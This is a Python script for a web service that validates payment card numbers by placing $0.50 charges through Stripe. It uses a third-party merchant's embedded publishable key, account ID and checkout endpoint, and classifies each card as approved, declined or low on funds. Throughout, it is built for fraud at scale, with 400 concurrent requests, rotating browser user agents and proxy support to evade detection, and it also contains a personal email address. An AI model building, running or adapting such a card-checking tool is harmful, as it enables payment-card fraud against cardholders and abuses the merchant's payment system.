#!/usr/bin/env python3
"""
Stripe Charge 0.50$ API | Based on Custom Gate Logic | Only Charge Endpoint
"""

import asyncio
import aiohttp
import json
import random
import re
import string
import time
import uuid
from datetime import datetime
from typing import Dict, Optional
import socket
from aiohttp import web
import urllib.parse

# ========== CONFIGURATION ==========
CONFIG = {
    "max_concurrent": 400,
    "port": 8000,
    "name": "Stripe Charge 0.50$ API",
    "version": "1.0"
}

# ========== COLOR CODES ==========
O = '\033[1;31m'  # Red
Z = '\033[1;37m'  # White
F = '\033[1;32m'  # Green
B = '\033[2;36m'  # Light Blue
X = '\033[1;33m'  # Yellow
C = '\033[2;35m'

# ========== REQUEST COUNTER ==========
request_counter = 0

# ========== HELPER FUNCTIONS ==========

def generate_user_agent():
    """Generate a random user agent similar to the original"""
    user_agents = [
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
    ]
    return random.choice(user_agents)

def parse_cc(cc_string):
    """Parse CC from file line format - handles both | and : separators"""
    cc_string = cc_string.replace('\n', '')
    parts = re.split('[:|]', cc_string)
    if len(parts) >= 4:
        year = parts[2]
        if len(year) == 4:
            year = year[2:]
        return {
            'number': parts[0],
            'month': parts[1],
            'year': year,
            'cvc': parts[3]
        }
    raise ValueError("Invalid CC format. Use: num|mm|yy|cvc or num:mm:yy:cvc")

# ========== PROXY TESTER ==========

async def test_proxy(session, proxy: str) -> tuple:
    """Test if proxy is working"""
    try:
        proxy_url = f"http://{proxy}" if not proxy.startswith(('http://', 'https://')) else proxy
        async with session.get('http://httpbin.org/ip', proxy=proxy_url, timeout=5) as response:
            if response.status == 200:
                data = await response.json()
                return True, "Live", data.get('origin')
            return False, "Dead", None
    except Exception as e:
        return False, f"Dead", None

# ========== STRIPE CHARGER (Based on Custom Gate Logic) ==========

class StripeCharger:
    """Logic from Stripe Charged 0.50$ - Custom Gate.py"""
    
    def __init__(self, proxy: str = None):
        self.proxy = proxy
        self.session = None
        self.proxy_url = f"http://{proxy}" if proxy and not proxy.startswith(('http://', 'https://')) else proxy
        self.user_agent = generate_user_agent()
    
    async def __aenter__(self):
        """Create session"""
        conn = aiohttp.TCPConnector(limit=0, ssl=False)
        self.session = aiohttp.ClientSession(connector=conn)
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def charge(self, cc_string: str) -> dict:
        """Charging logic from Stripe Charged 0.50$ - Custom Gate.py"""
        start_time = time.time()
        
        try:
            # Parse CC
            parsed = parse_cc(cc_string)
            n = parsed['number']
            mm = parsed['month']
            yy = parsed['year']
            cvc = parsed['cvc']
            
            # STEP 1: Create payment method with Stripe
            headers1 = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': self.user_agent,
            }
            
            # EXACT data format from original
            data1 = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=c1021d5e-9268-4e37-8fec-69e62febf036eb0009&muid=45ca4105-3fdf-428b-9bb3-8d11faa8900cf31ad6&sid=c20f2958-a407-4e77-bf5b-48a2802fc2b3e52fae&payment_user_agent=stripe.js%2Fa0db62dbc6%3B+stripe-js-v3%2Fa0db62dbc6%3B+card-element&referrer=https%3A%2F%2Fwww.fatfreecartpro.com&time_on_page=109269&key=pk_test_8OpUolxjZkzilLV7TpGkvt3r&_stripe_account=acct_1AEJ4sKYCoy7qCEU&radar_options'
            
            response1 = await self.session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers1,
                data=data1,
                proxy=self.proxy_url
            )
            
            # Add delay as in original
            await asyncio.sleep(5)
            
            response1_json = await response1.json()
            
            # Check if payment method was created successfully
            if response1.status != 200 or 'id' not in response1_json:
                error_msg = response1_json.get('error', {}).get('message', 'Failed to create payment method')
                return {
                    "cc": cc_string,
                    "status": "error",
                    "message": f"Stripe error: {error_msg}",
                    "live": False,
                    "time": int((time.time() - start_time) * 1000)
                }
            
            payment_method_id = response1_json['id']
            
            # STEP 2: Process payment with fatfreecartpro
            headers2 = {
                'authority': 'www.fatfreecartpro.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
                'content-type': 'application/json',
                'origin': 'https://www.fatfreecartpro.com',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': self.user_agent,
            }
            
            # EXACT json data from original
            json_data = {
                'payment_method_id': payment_method_id,
                'cart_id': '209511478',
                'cart_md5': '29c412a4be4f216a62e77b862406737b',
                'first_name': 'Ayush',
                'last_name': 'Pro',
                'email': 'ayushkumar20019@gmail.com',
            }
            
            response2 = await self.session.post(
                'https://www.fatfreecartpro.com/ecom/ccv3/assets-php/Stripe/stripeValidate.php',
                headers=headers2,
                json=json_data,
                proxy=self.proxy_url
            )
            
            response2_text = await response2.text()
            time_taken = int((time.time() - start_time) * 1000)
            
            # IMPROVED RESPONSE PROCESSING
            # Check for success conditions
            success_patterns = [
                '"success":true',
                'Payment success',
                'Payment Completed.',
                'Thank you for your support.',
                'Success',
                'Thank you',
                'CHARGED',
                'approved',
                'Nice!',
                'Approved',
                'Successful',
                'successful',
                'confirmed',
                'successfully'
            ]
            
            for pattern in success_patterns:
                if pattern.lower() in response2_text.lower():
                    return {
                        "cc": cc_string,
                        "status": "approved",
                        "message": "Stripe Charged 0.50$ ✅",
                        "live": True,
                        "payment_method_id": payment_method_id[:10] + "..." + payment_method_id[-6:] if payment_method_id else None,
                        "time": time_taken,
                        "charge_amount": "$0.50"
                    }
            
            # Check for specific decline messages
            if 'Your card was declined' in response2_text:
                return {
                    "cc": cc_string,
                    "status": "declined",
                    "message": "Your card was Declined ❌",
                    "live": False,
                    "time": time_taken,
                    "charge_amount": "$0.50"
                }
            elif 'funds' in response2_text.lower():
                return {
                    "cc": cc_string,
                    "status": "insufficient_funds",
                    "message": "Insufficient Funds ✅",
                    "live": False,
                    "time": time_taken,
                    "charge_amount": "$0.50"
                }
            else:
                return {
                    "cc": cc_string,
                    "status": "declined",
                    "message": response2_text[:100] if len(response2_text) < 100 else "Transaction declined",
                    "live": False,
                    "time": time_taken,
                    "charge_amount": "$0.50"
                }
                
        except Exception as e:
            time_taken = int((time.time() - start_time) * 1000)
            return {
                "cc": cc_string,
                "status": "error",
                "message": str(e)[:100],
                "live": False,
                "time": time_taken,
                "charge_amount": "$0.50"
            }

# ========== API HANDLER ==========

semaphore = asyncio.Semaphore(CONFIG["max_concurrent"])

async def charge_handler(request):
    """Handle /charge?cc=...&proxy=... requests"""
    global request_counter
    request_counter += 1
    current_id = request_counter
    
    cc_param = request.query.get('cc', '')
    proxy_param = request.query.get('proxy', None)
    
    if not cc_param:
        return web.json_response({
            "error": "Missing cc parameter",
            "usage": "/charge?cc=4111111111111111|12|25|123&proxy=127.0.0.1:8080"
        }, status=400)
    
    # Validate CC format
    try:
        parse_cc(cc_param)
    except ValueError as e:
        return web.json_response({
            "error": str(e)
        }, status=400)
    
    # Test proxy if provided
    proxy_status = "Not used"
    if proxy_param:
        try:
            async with aiohttp.ClientSession() as test_session:
                is_live, status_msg, proxy_ip = await test_proxy(test_session, proxy_param)
                proxy_status = status_msg
                
                if not is_live:
                    return web.json_response({
                        "request_id": current_id,
                        "cc": cc_param,
                        "status": "error",
                        "message": "Proxy is dead",
                        "proxy_status": proxy_status,
                        "live": False,
                        "time": 0,
                        "charge_amount": "$0.50"
                    })
                print(f"{B}[{current_id}] Proxy: {proxy_param} - {proxy_status}{Z}")
        except Exception as e:
            proxy_status = "Test failed"
    
    # Use semaphore for concurrency control
    async with semaphore:
        print(f"{X}[{current_id}] Processing: {cc_param[:16]}... Proxy: {proxy_param if proxy_param else 'None'}{Z}")
        
        try:
            async with StripeCharger(proxy_param) as charger:
                result = await charger.charge(cc_param)
                
                # Add metadata
                result["request_id"] = current_id
                result["proxy_status"] = proxy_status
                
                # Color code based on status
                if result['status'] == 'approved':
                    print(f"{F}[{current_id}] ✅ APPROVED - {result['message']}{Z}")
                elif result['status'] == 'insufficient_funds':
                    print(f"{X}[{current_id}] ⚠️ INSUFFICIENT FUNDS - {result['message']}{Z}")
                elif result['status'] == 'declined':
                    print(f"{O}[{current_id}] ❌ DECLINED - {result['message']}{Z}")
                else:
                    print(f"{O}[{current_id}] ❌ ERROR - {result['message']}{Z}")
                
                return web.json_response(result)
                
        except Exception as e:
            return web.json_response({
                "request_id": current_id,
                "cc": cc_param,
                "status": "error",
                "message": f"API Error: {str(e)[:100]}",
                "proxy_status": proxy_status,
                "live": False,
                "time": 0,
                "charge_amount": "$0.50"
            }, status=500)

# ========== MAIN ==========

async def main():
    """Start the API server"""
    print(F)
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║              STRIPE CHARGE 0.50$ API v1.0                   ║")
    print("║         400 Concurrent | Custom Gate Logic                  ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(Z)
    
    # Get local IP
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except:
        local_ip = "127.0.0.1"
    
    # Setup app with ONLY charge endpoint
    app = web.Application()
    app.router.add_get('/charge', charge_handler)
    
    print(f"{F}✅ Server started successfully!{Z}")
    print(f"{X}📱 Local: http://localhost:{CONFIG['port']}/charge?cc=4111111111111111|12|25|123{Z}")
    print(f"{X}🌐 Network: http://{local_ip}:{CONFIG['port']}/charge?cc=4111111111111111|12|25|123{Z}")
    print(f"{C}🚀 Max concurrent: {CONFIG['max_concurrent']}{Z}")
    print(f"{B}📝 Using Custom Gate Logic - Stripe 0.50$ Charged{Z}")
    
    # Start server
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', CONFIG["port"])
    await site.start()
    
    # Keep running
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{O}⚠️ Server stopped by user{Z}")
    except Exception as e:
        print(f"\n{O}❌ Fatal error: {e}{Z}")